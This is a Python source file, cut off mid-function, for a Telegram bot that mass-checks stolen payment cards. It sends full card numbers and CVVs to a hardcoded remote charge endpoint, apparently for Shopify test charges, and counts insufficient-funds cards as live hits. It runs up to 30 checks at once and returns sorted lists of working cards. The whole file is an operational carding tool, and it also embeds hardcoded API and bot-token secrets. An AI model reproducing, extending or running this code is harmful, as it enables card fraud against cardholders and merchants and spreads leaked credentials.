#BY 𝗠𝗔𝗘𝗦𝗧𝗥𝗢: https://t.me/of2of2
from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import time
import json
import re
import logging
from datetime import datetime

# ========== Logging ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ========== Config ==========
API_ID = 33350554
API_HASH = 'f0c9cd31e587a08cda09b1e725d3dd67'
BOT_TOKEN = '8960684510:AAFQXVswk0eoxzmfko0VixgEI5cqwcwDIKw'
ADMIN_ID = [8527559335]

CHECKER_API_URL = 'http://181.214.136.123:9091/pyrixcharge'

OWNER_USERNAME = "@VMV_U"

MAINTENANCE_FILE = 'maintenance.json'
_maintenance_cache = {'enabled': None, 'last_check': 0}

STATS_FILE = 'stats.json'
IMAGE_FILE = 'welcome_image.jpg'
COOLDOWN_SECONDS = 5

# ═══════════════════════════════════════════════════
# ✅ Premium Emoji
# ═══════════════════════════════════════════════════
PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5444860552310457690", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "5444931419270839381", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5364052602357044385", "⭐": "5343636681473935403",
    "🆓": "5406756500108501710", "👑": "5303547611351902889", "🔍": "5258396243666681152",
    "⏱️": "5303243514782443814", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5116575178012235794", "🔄": "5454245266305604993",
    "🏦": "5303159080020372094", "🥰": "5881784744949062058", "😱": "5868517294618975202",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5454074580010295588",
    "👥": "5454371323595744068", "🥕": "5116599934203724812", "🌳": "5305346287820895195",
    "🦉": "5123344136665039833", "🍑": "5258121851091043775", "💪": "5305622454218024328",
    "🌝": "5404494035891023578", "📁": "5447408120752013199", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5283232570660634549",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5305618829265628111",
    "📌": "5447187153274567373", "💸": "5447579253723918909",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798", "⛔️": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737", "📸": "5445344161333015312",
    "💬": "5447510826304959724", "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📹": "5445158077579952110", "📡": "5447448489149625830",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
}

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

# ═══════════════════════════════════════════════════
# ✅ Bot Client
# ═══════════════════════════════════════════════════
bot = TelegramClient('maestro_bot_v2', API_ID, API_HASH)

# ========== Global State ==========
active_sessions = {}
user_locks = {}
user_last_check = {}
admin_states = {}

# ========== Helpers ==========
def is_admin(user_id):
    return user_id in ADMIN_ID

def can_check(user_id):
    if is_admin(user_id):
        return True, None

    if user_id in user_locks:
        return False, "⚠️ <b>You already have a check in progress.</b>\n\nPlease wait until it finishes."

    last = user_last_check.get(user_id, 0)
    remaining = COOLDOWN_SECONDS - (time.time() - last)
    if remaining > 0:
        return False, f"⏱️ Please wait <b>{remaining:.0f}s</b> before next check."

    return True, None

def image_exists():
    return os.path.exists(IMAGE_FILE) and os.path.getsize(IMAGE_FILE) > 0

# ========== Maintenance ==========
async def load_maintenance():
    global _maintenance_cache
    try:
        if not os.path.exists(MAINTENANCE_FILE):
            _maintenance_cache = {'enabled': False, 'last_check': time.time()}
            return False
        async with aiofiles.open(MAINTENANCE_FILE, 'r') as f:
            data = json.loads(await f.read())
            _maintenance_cache = {'enabled': data.get('maintenance', False), 'last_check': time.time()}
            return _maintenance_cache['enabled']
    except:
        _maintenance_cache = {'enabled': False, 'last_check': time.time()}
        return False

async def set_maintenance(enabled):
    global _maintenance_cache
    try:
        async with aiofiles.open(MAINTENANCE_FILE, 'w') as f:
            await f.write(json.dumps({'maintenance': enabled}))
        _maintenance_cache = {'enabled': enabled, 'last_check': time.time()}
        return True
    except:
        return False

async def get_maintenance():
    global _maintenance_cache
    now = time.time()
    if _maintenance_cache['enabled'] is not None and now - _maintenance_cache['last_check'] < 30:
        return _maintenance_cache['enabled']
    return await load_maintenance()

async def check_maintenance(event):
    if await get_maintenance() and event.sender_id not in ADMIN_ID:
        await event.reply(premium_emoji(
            "⚠️ <b>Bot Under Maintenance</b>\n\n"
            "Please try again later."
        ), parse_mode='html')
        return True
    return False

# ========== Stats ==========
def load_stats():
    default = {
        "total_checks": 0, "total_charged": 0, "total_approved": 0,
        "total_dead": 0, "started_at": time.time()
    }
    if not os.path.exists(STATS_FILE):
        return default
    try:
        with open(STATS_FILE, 'r') as f:
            data = json.load(f)
            for k, v in default.items():
                data.setdefault(k, v)
            return data
    except:
        return default

def save_stats(s):
    try:
        with open(STATS_FILE, 'w') as f:
            json.dump(s, f, indent=2)
    except Exception as e:
        logger.error(f"Stats save error: {e}")

bot_stats = load_stats()

# ========== Progress Helpers ==========
def make_progress_bar(current, total, length=18):
    if total == 0:
        return "░" * length
    filled = int(length * current / total)
    return "█" * filled + "░" * (length - filled)

def calc_eta(start_time, checked, total):
    if checked == 0:
        return "N/A"
    elapsed = time.time() - start_time
    rate = checked / elapsed
    if rate <= 0:
        return "N/A"
    remaining = (total - checked) / rate
    m, s = divmod(int(remaining), 60)
    return f"{m:02d}:{s:02d}"

def calc_speed(start_time, checked):
    elapsed = time.time() - start_time
    if elapsed <= 0:
        return 0
    return int(checked / elapsed * 60)

# ========== Keyboard ==========
def get_main_menu_keyboard(user_id=None):
    buttons = [
        [Button.inline(" 📋 Commands", b"show_cmds", style="success")],
    ]
    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline(" 👑 Admin Panel", b"admin_panel", style="success")])
    return buttons

# ========== BIN Info ==========
async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

# ========== CC Utils ==========
def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

# ========== Checker ==========
async def check_card(card):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Declined', 'message': 'Invalid card format', 'card': card,
                    'amount': '-', 'decline_code': '-', 'transaction_id': '-',
                    'time_taken': '-', 'display': '-', 'raw_db': '-', 'gateway': 'Shopify',
                    'api_status': '-'}

        url = f'{CHECKER_API_URL}?cc={card}'

        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Declined', 'message': f'HTTP {resp.status}', 'card': card,
                            'amount': '-', 'decline_code': '-', 'transaction_id': '-',
                            'time_taken': '-', 'display': '-', 'raw_db': '-', 'gateway': 'Shopify',
                            'api_status': f'HTTP {resp.status}'}
                try:
                    raw = await resp.json()
                except Exception:
                    text = await resp.text()
                    return {'status': 'Declined', 'message': f'Invalid JSON: {text[:100]}', 'card': card,
                            'amount': '-', 'decline_code': '-', 'transaction_id': '-',
                            'time_taken': '-', 'display': '-', 'raw_db': '-', 'gateway': 'Shopify',
                            'api_status': 'Invalid JSON'}

        amount = raw.get('amount', '-')
        approved_flag = raw.get('approved', False)
        decline_code = raw.get('decline_code', '-')
        status_field = str(raw.get('status', '')).strip()
        time_field = raw.get('time', '-')
        txn_id = raw.get('transaction_id', '-')

        raw_block = raw.get('raw', {}) or {}
        raw_db = raw_block.get('db', '-')
        display = raw_block.get('display', '-')

        gateway = 'Shopify'

        status_lower = status_field.lower()
        decline_lower = str(decline_code).lower()
        display_lower = str(display).lower()
        db_lower = str(raw_db).lower()

        # ✅ التصنيف — insufficient_funds = Approved
        if status_lower == 'charged' or approved_flag is True:
            final_status = 'Charged'
        elif status_lower == 'approved':
            final_status = 'Approved'
        elif ('insufficient_funds' in decline_lower
              or 'insufficient funds' in db_lower
              or 'insufficient funds' in display_lower
              or 'insufficient account balance' in db_lower
              or 'insufficient account balance' in display_lower):
            final_status = 'Approved'
        else:
            final_status = 'Declined'

        short_msg = display if display and display != '-' else (raw_db if raw_db != '-' else status_field or 'Declined')

        return {
            'status': final_status,
            'message': short_msg,
            'card': card,
            'amount': amount,
            'decline_code': decline_code,
            'transaction_id': txn_id,
            'time_taken': time_field,
            'display': display,
            'raw_db': raw_db,
            'gateway': gateway,
            'api_status': status_field,
        }

    except asyncio.TimeoutError:
        return {'status': 'Declined', 'message': 'Request timeout', 'card': card,
                'amount': '-', 'decline_code': '-', 'transaction_id': '-',
                'time_taken': '-', 'display': '-', 'raw_db': '-', 'gateway': 'Shopify',
                'api_status': 'Timeout'}
    except Exception as e:
        return {'status': 'Declined', 'message': str(e), 'card': card,
                'amount': '-', 'decline_code': '-', 'transaction_id': '-',
                'time_taken': '-', 'display': '-', 'raw_db': '-', 'gateway': 'Shopify',
                'api_status': str(e)[:30]}

# ========== Progress ==========
async def update_progress(user_id, message_id, results, checked):
    total = results['total']
    pct = int(checked / total * 100) if total else 0
    bar = make_progress_bar(checked, total)
    eta = calc_eta(results['start_time'], checked, total)
    speed = calc_speed(results['start_time'], checked)

    session_key = f"{user_id}_{message_id}"
    is_paused = active_sessions.get(session_key, {}).get('paused', False)
    status_icon = "⏸️ PAUSED" if is_paused else "🔥 RUNNING"

    progress_text = f"""{status_icon}

📦 Progress <code>[{bar}]</code> {pct}%
✅ Checked: <b>{checked}</b> / <b>{total}</b>
⚡ Speed: <b>{speed}</b> cards/min
⏱️ ETA: <b>{eta}</b>

💳 Last CC: <code>{results.get('last_card', 'None')}</code>
📝 Response: <b>{results.get('last_response', '-')}</b>
💰 Amount: <b>{results.get('last_amount', '-')}</b>
🔻 Decline Code: <b>{results.get('last_decline', '-')}</b>
🔥 Gateway: <b>{results.get('last_gateway', '-')}</b>

┌───────────────────┐
│ ✅ Charged:  <b>{len(results['charged'])}</b>
│ 🟢 Approved: <b>{len(results['approved'])}</b>
│ ❌ Declined: <b>{len(results['dead'])}</b>
└───────────────────┘"""

    if is_paused:
        pause_btn = Button.inline(" ▶️ Resume", f"resume_{user_id}".encode(), style="success")
    else:
        pause_btn = Button.inline(" ⏸️ Pause", f"pause_{user_id}".encode(), style="primary")

    buttons = [
        [pause_btn, Button.inline(" 🛑 Stop", f"stop_{user_id}".encode(), style="danger")],
        [Button.inline(f" ✅ Charged {len(results['charged'])}", b"none", style="success"),
         Button.inline(f" 🟢 Approved {len(results['approved'])}", b"none", style="primary")],
        [Button.inline(f" ❌ Declined {len(results['dead'])}", b"none", style="danger")]
    ]

    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text),
                               buttons=buttons, parse_mode='html')
    except:
        pass

# ========== Final Results (يُرسل عند الإيقاف أو النهاية) ==========
async def send_final_results(user_id, results, stopped=False):
    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    status_word = "🛑 Stopped" if stopped else "✅ Complete"

    summary = f"""{status_word}!

📊 Results:
   ┣ ✅ Charged: {len(results['charged'])}
   ┣ 🔥 Approved: {len(results['approved'])}
   ┣ ❌ Declined: {len(results['dead'])}
   ┗ 📊 Checked: {results['checked']} / {results['total']}

Hits:
{hits_text}

BY {OWNER_USERNAME}"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"maestro_{timestamp}.txt"

    try:
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            await f.write("=" * 70 + "\n")
            await f.write("CC CHECKER RESULTS\n")
            await f.write("=" * 70 + "\n\n")

            # ✅ CHARGED
            await f.write(f"💎 CHARGED ({len(results['charged'])}):\n")
            await f.write("-" * 70 + "\n")
            for r in results['charged']:
                await f.write(f"CC       : {r['card']}\n")
                await f.write(f"Amount   : {r.get('amount', '-')}\n")
                await f.write(f"Status   : {r.get('api_status', '-')}\n")
                await f.write(f"Decline  : {r.get('decline_code', '-')}\n")
                await f.write(f"Display  : {r.get('display', '-')}\n")
                await f.write(f"Raw DB   : {r.get('raw_db', '-')}\n")
                await f.write(f"TXN ID   : {r.get('transaction_id', '-')}\n")
                await f.write(f"Time     : {r.get('time_taken', '-')}\n")
                await f.write(f"Gateway  : {r.get('gateway', 'Shopify')}\n")
                await f.write("-" * 70 + "\n")

            await f.write("\n")

            # ✅ APPROVED
            await f.write(f"✅ APPROVED ({len(results['approved'])}):\n")
            await f.write("-" * 70 + "\n")
            for r in results['approved']:
                await f.write(f"CC       : {r['card']}\n")
                await f.write(f"Amount   : {r.get('amount', '-')}\n")
                await f.write(f"Status   : {r.get('api_status', '-')}\n")
                await f.write(f"Decline  : {r.get('decline_code', '-')}\n")
                await f.write(f"Display  : {r.get('display', '-')}\n")
                await f.write(f"Raw DB   : {r.get('raw_db', '-')}\n")
                await f.write(f"TXN ID   : {r.get('transaction_id', '-')}\n")
                await f.write(f"Time     : {r.get('time_taken', '-')}\n")
                await f.write(f"Gateway  : {r.get('gateway', 'Shopify')}\n")
                await f.write("-" * 70 + "\n")

            await f.write("\n")

            # ✅ DECLINED
            await f.write(f"❌ DECLINED ({len(results['dead'])}):\n")
            await f.write("-" * 70 + "\n")
            for r in results['dead']:
                await f.write(f"CC       : {r['card']}\n")
                await f.write(f"Amount   : {r.get('amount', '-')}\n")
                await f.write(f"Status   : {r.get('api_status', '-')}\n")
                await f.write(f"Decline  : {r.get('decline_code', '-')}\n")
                await f.write(f"Display  : {r.get('display', '-')}\n")
                await f.write(f"Raw DB   : {r.get('raw_db', '-')}\n")
                await f.write(f"TXN ID   : {r.get('transaction_id', '-')}\n")
                await f.write(f"Time     : {r.get('time_taken', '-')}\n")
                await f.write(f"Gateway  : {r.get('gateway', 'Shopify')}\n")
                await f.write("-" * 70 + "\n")

        await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')
    except Exception as e:
        logger.error(f"send_final_results error: {e}")
    finally:
        try:
            if os.path.exists(filename):
                os.remove(filename)
        except Exception as e:
            logger.error(f"Delete report failed: {e}")

# ========== Start ==========
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    if await check_maintenance(event): return

    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"

    welcome_text = f"""👋 Hey @{username}!

🎁 How to use:
   🦉 Check CC: <code>/cc card|mm|yy|cvv</code>
   🦉 Mass check: <code>/chk</code> (reply to .txt)

BY {OWNER_USERNAME}"""

    buttons = get_main_menu_keyboard(user_id)

    if image_exists():
        try:
            await event.reply(premium_emoji(welcome_text), file=IMAGE_FILE,
                              buttons=buttons, parse_mode='html')
            return
        except Exception as e:
            logger.error(f"Send image failed: {e}")

    await event.reply(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')

# ========== Cancel ==========
@bot.on(events.NewMessage(pattern='/cancel'))
async def cancel_command(event):
    user_id = event.sender_id
    if user_id in admin_states:
        admin_states.pop(user_id, None)
        await event.reply(premium_emoji("✅ Cancelled."), parse_mode='html')

# ========== Maintenance Command ==========
@bot.on(events.NewMessage(pattern=r'^[/.]maintenance\s+(on|off)$'))
async def maintenance_cmd(event):
    if not is_admin(event.sender_id):
        return
    arg = event.message.text.lower().split()[1]
    enabled = (arg == "on")
    await set_maintenance(enabled)

    if enabled:
        msg = "🔴 <b>Maintenance ON</b>"
    else:
        msg = "🟢 <b>Maintenance OFF</b>"

    await event.reply(premium_emoji(msg), parse_mode='html')

# ========== Callbacks: Menu ==========
@bot.on(events.CallbackQuery(data=b"show_cmds"))
async def show_commands_callback(event):
    commands_text = """📋 User Commands

🛒 Shopify
├─ <code>/cc cc|mm|yy|cvv</code> → Check single card
└─ <code>/chk</code> → Mass check from .txt file"""

    buttons = [[Button.inline(" Back", b"main_menu", style="danger")]]
    await event.edit(premium_emoji(commands_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_callback(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"

    welcome_text = f"""👋 Hey @{username}!

🎁 How to use:
   ➥ Check CC: <code>/cc card|mm|yy|cvv</code>
   ➥ Mass check: <code>/chk</code> (reply to .txt)

BY {OWNER_USERNAME}"""

    buttons = get_main_menu_keyboard(user_id)

    if image_exists():
        try:
            await event.delete()
            await bot.send_file(user_id, IMAGE_FILE, caption=premium_emoji(welcome_text),
                                buttons=buttons, parse_mode='html')
            return
        except Exception as e:
            logger.error(f"Send image failed: {e}")

    try:
        await event.edit(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')
    except:
        pass

# ========== Admin Panel ==========
@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_callback(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("❌ Access Denied. Admin only.", alert=True)
        return

    maint_status = "🔴 ON" if await get_maintenance() else "🟢 OFF"

    admin_text = f"""👑 <b>Admin Panel</b>

🔧 <b>Maintenance:</b> {maint_status}
   └ <code>/maintenance on</code> | <code>/maintenance off</code>

📊 <b>Bot Statistics</b>
└─ View live bot stats

🖼️ <b>Bot Image</b>
└─ Add / Remove welcome image"""

    buttons = [
        [Button.inline(" 🖼️ Bot Image", b"image_menu", style="success")],
        [Button.inline(" 📊 Bot Statistics", b"stats_menu", style="success")],
        [Button.inline(" Back", b"main_menu", style="danger")]
    ]
    await event.edit(premium_emoji(admin_text), buttons=buttons, parse_mode='html')

# ========== Stats Menu ==========
@bot.on(events.CallbackQuery(data=b"stats_menu"))
async def stats_menu_callback(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("❌ Access Denied.", alert=True)
        return

    uptime = time.time() - bot_stats['started_at']
    hours, rem = divmod(int(uptime), 3600)
    minutes, seconds = divmod(rem, 60)

    maint_status = "🔴 ON" if await get_maintenance() else "🟢 OFF"

    stats_text = f"""📊 <b>Bot Statistics</b>

⏱️ <b>Uptime:</b> {hours}h {minutes}m {seconds}s
👑 <b>Admins:</b> {len(ADMIN_ID)}
🔄 <b>Active Sessions:</b> {len(active_sessions)}
🖼️ <b>Bot Image:</b> {'✅ Set' if image_exists() else '❌ Not Set'}
🔧 <b>Maintenance:</b> {maint_status}

📈 <b>Lifetime Stats</b>
├─ 🔍 Total Checks: <b>{bot_stats['total_checks']}</b>
├─ ✅ Charged: <b>{bot_stats['total_charged']}</b>
├─ 🟢 Approved: <b>{bot_stats['total_approved']}</b>
└─ ❌ Declined: <b>{bot_stats['total_dead']}</b>

🤖 <b>Status:</b> Running ✅"""

    buttons = [[Button.inline(" Back", b"admin_panel", style="danger")]]
    await event.edit(premium_emoji(stats_text), buttons=buttons, parse_mode='html')

# ========== Image Menu ==========
@bot.on(events.CallbackQuery(data=b"image_menu"))
async def image_menu_callback(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("❌ Access Denied.", alert=True)
        return

    exists = image_exists()
    status = "✅ <b>Active</b>" if exists else "❌ <b>Not Set</b>"

    text = f"""🖼️ <b>Bot Welcome Image</b>

📊 <b>Status:</b> {status}"""

    buttons = []
    if exists:
        buttons.append([Button.inline(" 🗑️ Remove Image", b"remove_image", style="danger")])
    buttons.append([Button.inline(" ➕ Add Image", b"add_image", style="success")])
    buttons.append([Button.inline(" Back", b"admin_panel", style="danger")])

    if exists:
        try:
            await event.delete()
            await bot.send_file(user_id, IMAGE_FILE, caption=premium_emoji(text),
                                buttons=buttons, parse_mode='html')
            return
        except Exception as e:
            logger.error(f"Image preview failed: {e}")

    await event.edit(premium_emoji(text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"add_image"))
async def add_image_callback(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("❌ Access Denied.", alert=True)
        return

    text = """🖼️ <b>Add Bot Image</b>

📝 Send the image as <b>photo</b> now."""

    admin_states[user_id] = 'awaiting_image'
    buttons = [[Button.inline(" Cancel", b"image_menu", style="danger")]]
    await event.edit(premium_emoji(text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"remove_image"))
async def remove_image_callback(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("❌ Access Denied.", alert=True)
        return

    if not image_exists():
        await event.answer("❌ No image to remove.", alert=True)
        return

    try:
        os.remove(IMAGE_FILE)
        await event.answer("✅ Image removed!", alert=True)
        await image_menu_callback(event)
    except Exception as e:
        await event.answer(f"❌ Error: {str(e)[:80]}", alert=True)

# ========== Handle Admin Input ==========
@bot.on(events.NewMessage())
async def handle_admin_input(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return

    state = admin_states.get(user_id)

    if state == 'awaiting_image':
        if not event.message.photo:
            await event.reply(premium_emoji(
                "❌ <b>Please send a valid photo</b>\n\nOr send /cancel to cancel."
            ), parse_mode='html')
            return

        admin_states.pop(user_id, None)

        try:
            await event.download_media(file=IMAGE_FILE)
            await event.reply(premium_emoji(
                f"✅ <b>Image Saved Successfully!</b>"
            ), parse_mode='html')
        except Exception as e:
            await event.reply(premium_emoji(f"❌ Failed: <code>{str(e)[:120]}</code>"), parse_mode='html')

# ========== Single CC Check ==========
@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    if await check_maintenance(event): return

    user_id = event.sender_id
    ok, reason = can_check(user_id)
    if not ok:
        await event.reply(premium_emoji(reason), parse_mode='html')
        return

    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return

    card = cards[0]
    user_locks[user_id] = True
    user_last_check[user_id] = time.time()

    status_msg = await event.reply(premium_emoji(f"🔄 Checking <code>{card}</code>..."), parse_mode='html')

    try:
        result = await check_card(card)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        if result['status'] == 'Charged':
            status_header = "💎 CHARGED"
        elif result['status'] == 'Approved':
            status_header = "✅ APPROVED"
        else:
            status_header = "❌ DECLINED"

        final_resp = f"""{status_header}

💳 CC <code>{result['card']}</code>

💰 Amount        {result.get('amount','-')}
📝 Status        {result.get('api_status','-')}
🔻 Decline Code  {result.get('decline_code','-')}
🆔 Transaction   {result.get('transaction_id','-')}
⏱️ Time          {result.get('time_taken','-')}
🔥 Gateway       {result.get('gateway','Shopify')}

📄 Display:
{result.get('display','-')}

📦 Raw DB:
{result.get('raw_db','-')}

🆔 BIN Info {brand} - {bin_type} - {level}
🏦 Bank {bank}
🥰 Country {country} {flag}

BY {OWNER_USERNAME}"""

        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')

        bot_stats['total_checks'] += 1
        if result['status'] == 'Charged':
            bot_stats['total_charged'] += 1
        elif result['status'] == 'Approved':
            bot_stats['total_approved'] += 1
        else:
            bot_stats['total_dead'] += 1
        save_stats(bot_stats)

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        user_locks.pop(user_id, None)
        user_last_check[user_id] = time.time()

# ========== Mass Check ==========
@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    if await check_maintenance(event): return

    user_id = event.sender_id
    ok, reason = can_check(user_id)
    if not ok:
        await event.reply(premium_emoji(reason), parse_mode='html')
        return

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Please reply to a .txt file containing cards."), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("🔄 Processing your file..."), parse_mode='html')

    file_path = None
    cards = []

    try:
        file_path = await reply_msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = extract_cc(content)
    except Exception as e:
        logger.error(f"File read error: {e}")
        await status_msg.edit(premium_emoji(f"❌ Error reading file: {e}"), parse_mode='html')
        return
    finally:
        if file_path and os.path.exists(file_path):
            try:
                os.remove(file_path)
            except Exception as e:
                logger.error(f"Delete cards file failed: {e}")

    if not cards:
        await status_msg.edit(premium_emoji("❌ No valid cards found in file."), parse_mode='html')
        return

    total_cards = len(cards)
    user_locks[user_id] = True
    user_last_check[user_id] = time.time()

    await status_msg.edit(premium_emoji(f"🔥 Starting check for {total_cards} cards..."), parse_mode='html')

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}

    all_results = {
        'charged': [], 'approved': [], 'dead': [],
        'total': total_cards, 'checked': 0,
        'start_time': time.time(),
        'last_card': '',
        'last_response': '-',
        'last_amount': '-',
        'last_decline': '-',
        'last_gateway': '-'
    }

    try:
        last_update_time = [time.time()]
        CONCURRENCY = 30

        async def worker(card):
            session_state = active_sessions.get(session_key)
            if not session_state:
                return
            while session_state.get('paused', False):
                await asyncio.sleep(1)
                session_state = active_sessions.get(session_key)
                if not session_state:
                    return

            res = await check_card(card)

            # ✅ تحديث كل التفاصيل للعرض المباشر
            all_results['last_card'] = card
            all_results['last_response'] = str(res.get('display', '-'))[:50]
            all_results['last_amount'] = res.get('amount', '-')
            all_results['last_decline'] = res.get('decline_code', '-')
            all_results['last_gateway'] = res.get('gateway', 'Shopify')

            if res['status'] == 'Charged':
                all_results['charged'].append(res)
            elif res['status'] == 'Approved':
                all_results['approved'].append(res)
            else:
                all_results['dead'].append(res)

            all_results['checked'] += 1

            now = time.time()
            if now - last_update_time[0] >= 2.0:
                last_update_time[0] = now
                if session_key in active_sessions:
                    try:
                        await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                    except Exception:
                        pass

        sem = asyncio.Semaphore(CONCURRENCY)

        async def bounded_worker(card):
            async with sem:
                await worker(card)

        tasks = [asyncio.create_task(bounded_worker(c)) for c in cards]

        while tasks:
            if session_key not in active_sessions:
                for t in tasks:
                    if not t.done():
                        t.cancel()
                break
            done, pending = await asyncio.wait(tasks, timeout=1.0)
            tasks = list(pending)

        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])

    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"❌ An error occurred: {e}"), parse_mode='html')
    finally:
        was_stopped = session_key not in active_sessions

        if session_key in active_sessions:
            del active_sessions[session_key]

        user_locks.pop(user_id, None)
        user_last_check[user_id] = time.time()

        bot_stats['total_checks'] += len(all_results['charged']) + len(all_results['approved']) + len(all_results['dead'])
        bot_stats['total_charged'] += len(all_results['charged'])
        bot_stats['total_approved'] += len(all_results['approved'])
        bot_stats['total_dead'] += len(all_results['dead'])
        save_stats(bot_stats)

        try:
            await status_msg.delete()
        except:
            pass

        # ✅ يرسل الملف دايماً — سواء اكتمل أو تم إيقافه
        await send_final_results(user_id, all_results, stopped=was_stopped)

# ========== Pause / Resume / Stop ==========
@bot.on(events.CallbackQuery(pattern=rb"pause_(\d+)"))
async def pause_handler(event):
    user_id = int(event.pattern_match.group(1).decode())
    if event.sender_id != user_id:
        await event.answer("❌ Not your session.", alert=True)
        return
    session_key = f"{user_id}_{event.message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer("⏸️ Paused", alert=True)

@bot.on(events.CallbackQuery(pattern=rb"resume_(\d+)"))
async def resume_handler(event):
    user_id = int(event.pattern_match.group(1).decode())
    if event.sender_id != user_id:
        await event.answer("❌ Not your session.", alert=True)
        return
    session_key = f"{user_id}_{event.message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer("▶️ Resumed", alert=True)

@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
async def stop_handler(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())
    if event.sender_id != user_id:
        await event.answer("❌ Not your session.", alert=True)
        return
    session_key = f"{user_id}_{event.message_id}"
    if session_key in active_sessions:
        # ✅ نحذف الجلسة — وبكده الـ finally في check_command هيبعت الملف تلقائياً
        del active_sessions[session_key]
        await event.answer("🛑 Stopped — sending report...", alert=True)
        try:
